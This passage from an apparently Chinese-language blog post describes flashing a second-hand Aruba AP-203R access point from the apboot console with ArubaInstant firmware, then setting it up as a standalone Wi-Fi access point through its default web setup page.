  build string: ArubaOS version 6.5.2.0-6.5.2.0 &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;Vela &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;p4build@pr-hpn-build01&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gcc version 4.7.2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#59123 Fri Apr 7 09:37:25 AST 2017&lt;/span&gt;
         flags: Instant preserve
           oem: aruba

Image is signed&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; verifying checksum... passed
SHA2 Signature available
Signer Cert OK
Policy Cert OK
RSA signature verified using SHA2.

Partition 1:
    image &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;: 0
  machine &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;: 46
          size: 13864872
       version: 6.5.2.0-6.5.2.0
  build string: ArubaOS version 6.5.2.0-6.5.2.0 &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;Vela &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;p4build@pr-hpn-build01&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gcc version 4.7.2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#59123 Fri Apr 7 09:37:25 AST 2017&lt;/span&gt;
         flags: Instant preserve
           oem: aruba

Image is signed&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; verifying checksum... passed
SHA2 Signature available
Signer Cert OK
Policy Cert OK
RSA signature verified using SHA2.

apboot&amp;gt; clear os 0  &lt;span class=&quot;c&quot;&gt;# 清除分区 0 的系统&lt;/span&gt;
apboot&amp;gt; upgrade os 0 ArubaInstant_Vela_8.5.0.3_72498    &lt;span class=&quot;c&quot;&gt;# os 0 分区刷入 TFTP Server 中的 ArubaInstant_Vela_8.5.0.3_72498 固件&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# 当看到 Upgrade successful 表示刷入成功&lt;/span&gt;

apboot&amp;gt; factory_reset   &lt;span class=&quot;c&quot;&gt;# ！重要：清除原来的配置&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;blockquote&gt;
  &lt;p&gt;建议将两个分区刷入同样的固件。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;配置-iap&quot;&gt;配置 IAP&lt;/h2&gt;

&lt;p&gt;等待 5 分钟左右，会出现一个 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SetMeUp-XX:XX:XX&lt;/code&gt; 类似的名字的 Wi-Fi 信号，就是刷新后的 Aruba IAP 的初始网络。&lt;/p&gt;

&lt;p&gt;连接上去后，打开浏览器，输入网址 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;https://setmeup.arubanetworks.com:4343/&lt;/code&gt; （有可能浏览器会提示此网站证书不受信任，直接点仍然继续访问）进入 web 设置界面，使用账号 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin&lt;/code&gt; 和密码 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;机器的 SN 号&lt;/code&gt; 登陆（8.5 以下系统是 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin/admin&lt;/code&gt;，开始和普通无线路由器一样设置网络。&lt;/p&gt;

&lt;p&gt;需要配置的地方为：&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;配置 - 接入点：设置 AP 的接入方式，如连接主路由，只需要在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;常规&lt;/code&gt;选项中选择 DHCP 即可&lt;/li&gt;
  &lt;li&gt;配置 - 网络：设置 Wi-Fi，新建即可，在高级选项中可以选择 2.4G 或 5G 网络，是否隐藏 SSID，加密方式等&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;设置完毕，将 AP 连接到路由器上就可以正常使用了。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/5cr1pt/img4markdown/master/pics/20200618175509.jpg&quot; alt=&quot;Overview&quot; /&gt;&lt;/p&gt;</content><author><name></name></author><category term="aruba" /><category term="ap" /><summary type="html">由于现在无线设备越来越多，同时需要兼顾看电影、打游戏、办公、智能家居、NAS 下载等，所以感觉现有的无线路由器有点力不从心，就咸鱼 200 块淘了一个 Aruba 的 AP-203R，希望 MU-MIMO 能带来更好的体验。然后淘回来发现是个没办法单独使用的瘦 AP，查找了一番资料，发现可以刷机变成胖 AP 单独使用，这里做个记录。</summary></entry></feed>